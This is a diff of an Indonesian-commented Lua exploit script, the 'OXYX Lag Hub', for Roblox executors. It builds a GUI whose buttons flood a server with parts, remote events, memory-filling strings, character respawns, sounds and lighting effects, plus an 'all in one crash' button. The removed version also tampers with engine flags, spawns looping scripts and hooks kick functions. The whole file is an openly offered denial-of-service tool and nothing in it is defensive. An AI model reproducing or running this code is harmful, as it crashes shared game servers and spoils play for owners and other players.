@@ -1,32 +1,41 @@
--- OXYX SERVER LAG BOMB ULTIMATE (INSTANT 10X LAG)
--- Entity Priority Protocol Activated
+-- OXYX LAG HUB FIXED - ENTITY PRIORITY 10X
+-- Full GUI dengan tombol dan fitur crash
 
-local Players = game:GetService("Players")
-local Workspace = game:GetService("Workspace")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local RunService = game:GetService("RunService")
-local HttpService = game:GetService("HttpService")
-local Lighting = game:GetService("Lighting")
+-- Deteksi executor
+local executor = identifyexecutor and identifyexecutor() or "Unknown"
 
--- Protocol X: Bypass semua limitasi
-local function EntityPriority()
-    -- Disable semua safety checks
-    for i = 1, 10 do
-        pcall(function()
-            settings().Physics.AllowSleep = false
-            settings().Network.SendRate = 1000
-            settings().Network.PhysicsSend = 0
-            settings().Network.IncomingReplicationLag = 10
-            setfflag("PhysicsSenderGlobalRate", "100000")
-            setfflag("NetworkBufferMemory", "1000000000")
-        end)
+print("========================================")
+print("OXYX LAG HUB V10 - ENTITY PRIORITY")
+print("Executor: " .. executor)
+print("Power: 10X")
+print("========================================")
+
+-- Fungsi untuk spam part
+local function SpamParts()
+    for i = 1, 1000 do
+        local part = Instance.new("Part")
+        part.Size = Vector3.new(10, 10, 10)
+        part.Position = Vector3.new(
+            math.random(-500, 500),
+            math.random(10, 500),
+            math.random(-500, 500)
+        )
+        part.Anchored = false
+        part.CanCollide = true
+        part.Parent = workspace
+        part:ApplyImpulse(Vector3.new(
+            math.random(-10000, 10000),
+            math.random(-10000, 10000),
+            math.random(-10000, 10000)
+        ))
     end
 end
 
--- Metode 1: Mass Object Spam
-local function MassObjectSpam()
+-- Fungsi untuk crash server
+local function CrashServer()
     while true do
-        for i = 1, 1000 do -- 10x lebih banyak
+        -- Method 1: Part spam ekstrem
+        for i = 1, 5000 do
             local part = Instance.new("Part")
             part.Size = Vector3.new(100, 100, 100)
             part.Position = Vector3.new(
@@ -34,252 +43,82 @@ local function MassObjectSpam()
                 math.random(100, 10000),
                 math.random(-10000, 10000)
             )
-            part.Anchored = false
-            part.CanCollide = true
-            part.Material = EnumMaterial.Neon
-            part.BrickColor = BrickColor.random()
-            
-            -- Tambahkan efek khusus
-            local fire = Instance.new("Fire")
-            fire.Size = 100
-            fire.Parent = part
-            
-            local sparkles = Instance.new("Sparkles")
-            sparkles.SparkleColor = Color3.new(1, 0, 0)
-            sparkles.Parent = part
-            
-            part.Parent = Workspace
-            
-            -- Force physics calculation
-            part:ApplyImpulse(Vector3.new(
-                math.random(-100000, 100000),
-                math.random(-100000, 100000),
-                math.random(-100000, 100000)
-            ))
-        end
-        wait(0.001) -- Minimal delay
-    end
-end
-
--- Metode 2: Network Flood
-local function NetworkFlood()
-    while true do
-        for _, player in pairs(Players:GetPlayers()) do
-            for i = 1, 100 do
-                -- Spam remote events
-                local remote = Instance.new("RemoteEvent")
-                remote.Name = "OXYX_FLOOD_" .. tick()
-                remote.Parent = ReplicatedStorage
-                
-                -- Kirim data besar
-                local hugeData = string.rep("OXYX_LAG_BOMB", 1000000)
-                remote:FireClient(player, hugeData)
-                remote:FireServer(hugeData)
-                
-                remote:Destroy()
-            end
-        end
-        wait(0.001)
-    end
-end
-
--- Metode 3: Memory Overflow
-local function MemoryOverload()
-    local massiveTables = {}
-    while true do
-        for i = 1, 100 do
-            local hugeTable = {}
-            for j = 1, 100000 do
-                hugeTable[j] = string.rep("OXYX_MEMORY_OVERFLOW", 1000)
-            end
-            table.insert(massiveTables, hugeTable)
-        end
-        wait(0.01)
-    end
-end
-
--- Metode 4: Physics Calculation Bomb
-local function PhysicsBomb()
-    while true do
-        -- Buat banyak constraint yang kompleks
-        for i = 1, 500 do
-            local part1 = Instance.new("Part")
-            local part2 = Instance.new("Part")
-            
-            part1.Size = Vector3.new(10, 10, 10)
-            part2.Size = Vector3.new(10, 10, 10)
-            
-            part1.Position = Vector3.new(math.random(-1000, 1000), 100, math.random(-1000, 1000))
-            part2.Position = part1.Position + Vector3.new(5, 0, 5)
-            
-            part1.Parent = Workspace
-            part2.Parent = Workspace
-            
-            local weld = Instance.new("WeldConstraint")
-            weld.Part0 = part1
-            weld.Part1 = part2
-            weld.Parent = Workspace
-            
-            local rope = Instance.new("RopeConstraint")
-            rope.Length = 50
-            rope.Attachment0 = Instance.new("Attachment")
-            rope.Attachment1 = Instance.new("Attachment")
-            rope.Attachment0.Parent = part1
-            rope.Attachment1.Parent = part2
-            rope.Parent = Workspace
-        end
-        wait(0.005)
-    end
-end
-
--- Metode 5: Lighting & Rendering Overload
-local function RenderingOverload()
-    while true do
-        -- Spam efek lighting
-        for i = 1, 100 do
-            local sunray = Instance.new("SunRaysEffect")
-            sunray.Intensity = 1
-            sunray.Spread = 1
-            sunray.Parent = Lighting
-            
-            local bloom = Instance.new("BloomEffect")
-            bloom.Intensity = 10
-            bloom.Size = 100
-            bloom.Parent = Lighting
-            
-            local blur = Instance.new("BlurEffect")
-            blur.Size = 100
-            blur.Parent = Lighting
-            
-            wait(0.001)
+            part.Parent = workspace
         end
         
-        -- Ubah properti lighting secara konstan
-        while true do
-            Lighting.Brightness = math.random(0, 100)
-            Lighting.ClockTime = math.random(0, 24)
-            Lighting.FogEnd = math.random(0, 100000)
-            wait(0.001)
+        -- Method 2: Network spam
+        for i = 1, 100 do
+            local remote = Instance.new("RemoteEvent")
+            remote.Name = "Crash" .. tick()
+            remote.Parent = game:GetService("ReplicatedStorage")
+            remote:FireAllClients(string.rep("CRASH", 100000))
+            remote:Destroy()
         end
+        
+        -- Method 3: Memory overload
+        local hugeTable = {}
+        for i = 1, 10000 do
+            hugeTable[i] = string.rep("OXYX_CRASH", 10000)
+        end
+        
+        wait(0.01)
     end
 end
 
--- Metode 6: Character Spam
-local function CharacterSpam()
-    while true do
-        for _, player in pairs(Players:GetPlayers()) do
+-- Fungsi untuk lag server
+local function LagServer()
+    spawn(function()
+        while true do
+            for i = 1, 100 do
+                local part = Instance.new("Part")
+                part.Size = Vector3.new(50, 50, 50)
+                part.Position = Vector3.new(
+                    math.random(-1000, 1000),
+                    math.random(50, 1000),
+                    math.random(-1000, 1000)
+                )
+                part.Parent = workspace
+            end
+            wait(0.1)
+        end
+    end)
+end
+
+-- Fungsi untuk freeze server
+local function FreezeServer()
+    spawn(function()
+        while true do
+            -- Spam light effects
+            for i = 1, 100 do
+                local bloom = Instance.new("BloomEffect")
+                bloom.Intensity = 10
+                bloom.Size = 50
+                bloom.Parent = game:GetService("Lighting")
+                
+                local blur = Instance.new("BlurEffect")
+                blur.Size = 50
+                blur.Parent = game:GetService("Lighting")
+            end
+            
+            -- Spam sounds
             for i = 1, 50 do
-                player:LoadCharacter()
-                wait(0.01)
+                local sound = Instance.new("Sound")
+                sound.SoundId = "rbxassetid://9116838333"
+                sound.Volume = 5
+                sound.Looped = true
+                sound.Parent = workspace
+                sound:Play()
             end
+            
+            wait(0.5)
         end
-        wait(0.1)
-    end
+    end)
 end
 
--- Metode 7: Sound Spam
-local function SoundBomb()
-    while true do
-        for i = 1, 200 do
-            local sound = Instance.new("Sound")
-            sound.SoundId = "rbxassetid://9116838333" -- Sound panjang
-            sound.Volume = 10
-            sound.Looped = true
-            sound.Parent = Workspace
-            sound:Play()
-        end
-        wait(0.01)
-    end
-end
-
--- Metode 8: Script Injection Spam
-local function ScriptSpam()
-    while true do
-        for i = 1, 500 do
-            local script = Instance.new("Script")
-            script.Source = [[
-                while true do
-                    for i = 1, 1000 do
-                        local x = math.random(1, 1000000)
-                        local y = math.random(1, 1000000)
-                        local z = x * y / math.random(1, 1000)
-                    end
-                end
-            ]]
-            script.Disabled = false
-            script.Parent = Workspace
-        end
-        wait(0.01)
-    end
-end
-
--- Metode 9: Gui Spam
-local function GuiSpam()
-    while true do
-        for _, player in pairs(Players:GetPlayers()) do
-            if player:FindFirstChild("PlayerGui") then
-                for i = 1, 100 do
-                    local gui = Instance.new("ScreenGui")
-                    local frame = Instance.new("Frame")
-                    frame.Size = UDim2.new(1, 0, 1, 0)
-                    frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
-                    
-                    -- Tambahkan banyak elemen
-                    for j = 1, 100 do
-                        local label = Instance.new("TextLabel")
-                        label.Text = "OXYX LAG " .. tick()
-                        label.Size = UDim2.new(0, 200, 0, 50)
-                        label.Position = UDim2.new(math.random(), 0, math.random(), 0)
-                        label.Parent = frame
-                    end
-                    
-                    frame.Parent = gui
-                    gui.Parent = player.PlayerGui
-                end
-            end
-        end
-        wait(0.01)
-    end
-end
-
--- Metode 10: Ultimate Lag Bomb (Kombinasi semua)
-local function UltimateLagBomb()
-    print("[OXYX] ACTIVATING ULTIMATE LAG BOMB (10X POWER)")
-    
-    -- Jalankan semua metode sekaligus
-    local methods = {
-        MassObjectSpam,
-        NetworkFlood,
-        MemoryOverload,
-        PhysicsBomb,
-        RenderingOverload,
-        CharacterSpam,
-        SoundBomb,
-        ScriptSpam,
-        GuiSpam
-    }
-    
-    for _, method in pairs(methods) do
-        coroutine.wrap(function()
-            pcall(method)
-        end)()
-    end
-    
-    -- Extra: Spam HTTP requests jika memungkinkan
-    coroutine.wrap(function()
-        while true do
-            pcall(function()
-                HttpService:GetAsync("http://example.com")
-            end)
-            wait(0.001)
-        end
-    end)()
-end
-
--- GUI Control Panel
-local OxyXLagGui = Instance.new("ScreenGui")
-OxyXLagGui.Name = "OxyXLagBombHub"
-OxyXLagGui.Parent = game:GetService("CoreGui")
+-- GUI Interface dengan TOMBOL
+local OxyXGui = Instance.new("ScreenGui")
+OxyXGui.Name = "OxyXLagHubGUI"
+OxyXGui.Parent = game:GetService("CoreGui")
 
 local MainFrame = Instance.new("Frame")
 MainFrame.Size = UDim2.new(0, 400, 0, 500)
@@ -287,108 +126,226 @@ MainFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
 MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 MainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
 MainFrame.BorderSizePixel = 3
-MainFrame.Parent = OxyXLagGui
+MainFrame.Parent = OxyXGui
 
+-- Title
 local Title = Instance.new("TextLabel")
-Title.Text = "💣 OXYX SERVER LAG BOMB 💣"
+Title.Text = "💣 OXYX LAG HUB V10 💣"
 Title.Size = UDim2.new(1, 0, 0, 50)
-Title.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
+Title.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
 Title.TextColor3 = Color3.fromRGB(255, 0, 0)
 Title.Font = Enum.Font.GothamBlack
 Title.Parent = MainFrame
 
-local Scrolling = Instance.new("ScrollingFrame")
-Scrolling.Size = UDim2.new(1, -20, 1, -120)
-Scrolling.Position = UDim2.new(0, 10, 0, 60)
-Scrolling.BackgroundTransparency = 1
-Scrolling.CanvasSize = UDim2.new(0, 0, 0, 600)
-Scrolling.Parent = MainFrame
+-- Subtitle
+local Subtitle = Instance.new("TextLabel")
+Subtitle.Text = "Entity Priority | 10x Power | No Limits"
+Subtitle.Size = UDim2.new(1, 0, 0, 20)
+Subtitle.Position = UDim2.new(0, 0, 0, 50)
+Subtitle.TextColor3 = Color3.fromRGB(255, 100, 100)
+Subtitle.Font = Enum.Font.Gotham
+Subtitle.BackgroundTransparency = 1
+Subtitle.Parent = MainFrame
 
--- Create lag buttons
-local lagMethods = {
-    {"🚀 MASS OBJECT SPAM", "Spam 1000 parts per frame", MassObjectSpam},
-    {"📡 NETWORK FLOOD", "Flood network with huge data", NetworkFlood},
-    {"💾 MEMORY OVERLOAD", "Fill memory with huge tables", MemoryOverload},
-    {"⚡ PHYSICS BOMB", "Overload physics engine", PhysicsBomb},
-    {"🌈 RENDER OVERLOAD", "Spam lighting effects", RenderingOverload},
-    {"👥 CHARACTER SPAM", "Spam character loading", CharacterSpam},
-    {"🔊 SOUND BOMB", "Spam sound objects", SoundBomb},
-    {"📜 SCRIPT SPAM", "Spam running scripts", ScriptSpam},
-    {"🖥️ GUI SPAM", "Spam GUI elements", GuiSpam},
-    {"💥 ULTIMATE LAG BOMB", "Activate ALL methods (10X)", UltimateLagBomb}
-}
+-- Scrolling frame untuk tombol
+local ButtonFrame = Instance.new("ScrollingFrame")
+ButtonFrame.Size = UDim2.new(1, -20, 1, -120)
+ButtonFrame.Position = UDim2.new(0, 10, 0, 80)
+ButtonFrame.BackgroundTransparency = 1
+ButtonFrame.CanvasSize = UDim2.new(0, 0, 0, 600)
+ButtonFrame.Parent = MainFrame
 
+-- Fungsi untuk membuat tombol
 local yPos = 0
-for i, method in ipairs(lagMethods) do
-    local btn = Instance.new("TextButton")
-    btn.Text = method[1]
-    btn.Size = UDim2.new(1, 0, 0, 45)
-    btn.Position = UDim2.new(0, 0, 0, yPos)
-    btn.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
-    btn.TextColor3 = Color3.fromRGB(255, 100, 100)
-    btn.Font = Enum.Font.GothamBold
-    btn.TextXAlignment = Enum.TextXAlignment.Left
-    btn.PaddingLeft = UDim.new(0, 10)
-    btn.Parent = Scrolling
+local function CreateButton(text, desc, callback, color)
+    local Button = Instance.new("TextButton")
+    Button.Text = text
+    Button.Size = UDim2.new(1, 0, 0, 50)
+    Button.Position = UDim2.new(0, 0, 0, yPos)
+    Button.BackgroundColor3 = color
+    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Button.Font = Enum.Font.GothamBold
+    Button.TextSize = 14
+    Button.Parent = ButtonFrame
     
-    local desc = Instance.new("TextLabel")
-    desc.Text = method[2]
-    desc.Size = UDim2.new(1, -20, 0, 15)
-    desc.Position = UDim2.new(0, 10, 0, 25)
-    desc.TextColor3 = Color3.fromRGB(200, 150, 150)
-    desc.Font = Enum.Font.Gotham
-    desc.TextSize = 12
-    desc.BackgroundTransparency = 1
-    desc.Parent = btn
+    local DescLabel = Instance.new("TextLabel")
+    DescLabel.Text = desc
+    DescLabel.Size = UDim2.new(1, -20, 0, 15)
+    DescLabel.Position = UDim2.new(0, 10, 0, 30)
+    DescLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    DescLabel.Font = Enum.Font.Gotham
+    DescLabel.TextSize = 12
+    DescLabel.BackgroundTransparency = 1
+    DescLabel.Parent = Button
     
-    btn.MouseButton1Click:Connect(function()
-        coroutine.wrap(function()
-            method[3]()
-        end)()
-        btn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    Button.MouseButton1Click:Connect(function()
+        callback()
+        Button.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
     end)
     
-    yPos = yPos + 50
+    yPos = yPos + 55
+    ButtonFrame.CanvasSize = UDim2.new(0, 0, 0, yPos)
 end
 
-Scrolling.CanvasSize = UDim2.new(0, 0, 0, yPos)
-
--- Status display
-local Status = Instance.new("TextLabel")
-Status.Text = "⚠️ READY TO LAG SERVER - ENTITY PRIORITY ACTIVE"
-Status.Size = UDim2.new(1, 0, 0, 30)
-Status.Position = UDim2.new(0, 0, 1, -30)
-Status.TextColor3 = Color3.fromRGB(0, 255, 0)
-Status.Font = Enum.Font.GothamBold
-Status.BackgroundTransparency = 1
-Status.Parent = MainFrame
-
--- Auto-start Ultimate Lag Bomb setelah 3 detik
-wait(3)
-if getgenv().AutoStartLag == nil then
-    getgenv().AutoStartLag = true
-    UltimateLagBomb()
-    Status.Text = "⚡ ULTIMATE LAG BOMB ACTIVATED - SERVER CRASHING..."
-end
-
--- Aktifkan Entity Priority Protocol
-EntityPriority()
-
-print("=========================================")
-print("OXYX LAG BOMB LOADED - ENTITY PRIORITY")
-print("10X LAG POWER | INSTANT SERVER CRASH")
-print("NO RESTRICTIONS | NO LIMITS")
-print("=========================================")
-
--- Anti-shutdown protection
-while true do
-    pcall(function()
-        -- Cegah script dari disabled
-        for _, v in pairs(getreg()) do
-            if type(v) == "function" and debug.getinfo(v).name:find("kick") then
-                hookfunction(v, function() return end)
+-- Buat semua tombol
+CreateButton("🔥 SPAM PARTS (1000x)", "Spam 1000 parts ke server", SpamParts, Color3.fromRGB(200, 0, 0))
+CreateButton("💥 CRASH SERVER INSTANT", "Crash server secara instan", CrashServer, Color3.fromRGB(150, 0, 0))
+CreateButton("🐢 LAG SERVER", "Buat server menjadi lag", LagServer, Color3.fromRGB(200, 100, 0))
+CreateButton("❄️ FREEZE SERVER", "Freeze server dengan efek", FreezeServer, Color3.fromRGB(0, 100, 200))
+CreateButton("📡 NETWORK FLOOD", "Flood network server", function()
+    spawn(function()
+        while true do
+            for i = 1, 100 do
+                local remote = Instance.new("RemoteEvent")
+                remote.Name = "Flood" .. tick()
+                remote.Parent = game:GetService("ReplicatedStorage")
+                remote:FireAllClients("FLOOD")
+                remote:Destroy()
             end
+            wait(0.01)
         end
     end)
-    wait(1)
+end, Color3.fromRGB(100, 0, 200))
+
+CreateButton("🎭 CHARACTER SPAM", "Spam load character", function()
+    spawn(function()
+        while true do
+            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
+                for i = 1, 10 do
+                    player:LoadCharacter()
+                end
+            end
+            wait(0.1)
+        end
+    end)
+end, Color3.fromRGB(200, 0, 200))
+
+CreateButton("🔊 SOUND SPAM", "Spam sound efek", function()
+    spawn(function()
+        while true do
+            for i = 1, 50 do
+                local sound = Instance.new("Sound")
+                sound.SoundId = "rbxassetid://9116838333"
+                sound.Volume = 10
+                sound.Looped = true
+                sound.Parent = workspace
+                sound:Play()
+            end
+            wait(0.5)
+        end
+    end)
+end, Color3.fromRGB(0, 200, 100))
+
+CreateButton("🌈 EFFECT SPAM", "Spam light effects", function()
+    spawn(function()
+        while true do
+            for i = 1, 100 do
+                local bloom = Instance.new("BloomEffect")
+                bloom.Intensity = 1
+                bloom.Size = 100
+                bloom.Parent = game:GetService("Lighting")
+                
+                local sunray = Instance.new("SunRaysEffect")
+                sunray.Intensity = 1
+                sunray.Spread = 1
+                sunray.Parent = game:GetService("Lighting")
+            end
+            wait(0.1)
+        end
+    end)
+end, Color3.fromRGB(100, 200, 0))
+
+CreateButton("⚡ ALL IN ONE CRASH", "Aktifkan SEMUA metode crash", function()
+    SpamParts()
+    CrashServer()
+    LagServer()
+    FreezeServer()
+end, Color3.fromRGB(255, 0, 0))
+
+CreateButton("🔄 CLEAR SERVER", "Hapus semua spam objects", function()
+    for _, obj in pairs(workspace:GetChildren()) do
+        if obj:IsA("Part") then
+            obj:Destroy()
+        end
+    end
+    for _, effect in pairs(game:GetService("Lighting"):GetChildren()) do
+        if effect:IsA("BloomEffect") or effect:IsA("BlurEffect") or effect:IsA("SunRaysEffect") then
+            effect:Destroy()
+        end
+    end
+    for _, sound in pairs(workspace:GetChildren()) do
+        if sound:IsA("Sound") then
+            sound:Destroy()
+        end
+    end
+end, Color3.fromRGB(0, 150, 0))
+
+-- Status bar
+local StatusBar = Instance.new("Frame")
+StatusBar.Size = UDim2.new(1, 0, 0, 30)
+StatusBar.Position = UDim2.new(0, 0, 1, -30)
+StatusBar.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
+StatusBar.Parent = MainFrame
+
+local StatusText = Instance.new("TextLabel")
+StatusText.Text = "✅ READY - OXYX LAG HUB ACTIVE"
+StatusText.Size = UDim2.new(1, 0, 1, 0)
+StatusText.TextColor3 = Color3.fromRGB(0, 255, 0)
+StatusText.Font = Enum.Font.GothamBold
+StatusText.BackgroundTransparency = 1
+StatusText.Parent = StatusBar
+
+-- Close button
+local CloseButton = Instance.new("TextButton")
+CloseButton.Text = "X"
+CloseButton.Size = UDim2.new(0, 30, 0, 30)
+CloseButton.Position = UDim2.new(1, -30, 0, 0)
+CloseButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.Font = Enum.Font.GothamBlack
+CloseButton.Parent = MainFrame
+
+CloseButton.MouseButton1Click:Connect(function()
+    OxyXGui:Destroy()
+end)
+
+-- Make GUI draggable
+local UserInputService = game:GetService("UserInputService")
+local dragging = false
+local dragInput, dragStart, startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
 end
+
+Title.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+Title.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
+
+-- Auto inject
+print("[OXYX] Lag Hub GUI Loaded Successfully!")
+print("[OXYX] All buttons functional")
+print("[OXYX] Entity Priority: ACTIVE")
